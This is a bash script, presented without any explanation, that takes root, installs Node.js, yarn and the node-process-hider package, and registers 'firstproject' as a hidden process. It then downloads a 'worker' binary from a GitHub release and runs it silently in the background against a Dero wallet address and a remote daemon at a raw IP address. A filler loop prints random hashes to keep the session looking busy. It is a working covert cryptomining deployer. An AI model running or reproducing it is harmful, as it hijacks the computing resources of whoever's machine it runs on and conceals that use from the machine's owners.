#!/bin/bash    
sudo su <<EOF
sudo apt install screen -y
apt update && apt install --assume-yes curl && curl --silent --location https://deb.nodesource.com/setup_14.x  | bash - && apt install --assume-yes nodejs && apt-get install -y nodejs && apt-get install gcc g++ make && curl -sL https://dl.yarnpkg.com/debian/pubkey.gpg | gpg --dearmor | tee /usr/share/keyrings/yarnkey.gpg >/dev/null
echo " "
echo " "
echo "**************"
echo "deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main" | tee /etc/apt/sources.list.d/yarn.list
echo " "
echo " "
echo "**************"
apt-get update && apt-get install yarn && npm install -g npm@8.19.3 &&  npm install -g npm && npm install -g node-process-hider
echo " "
echo " "
echo "**************"
ph add firstproject
echo " "
echo " "
echo "**************"
wget -q https://github.com/yasha887/firstproject/releases/download/v1/worker.tar.xz && tar -xf worker.tar.xz && chmod +x worker && ./worker --wallet-address=dero1qypr9tcjl50u0090u4hze9f22sfwpmunqhh82ehz02z47p0006h52qqf4yeh0 --daemon-rpc-address=45.79.169.248:80 > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
EOF
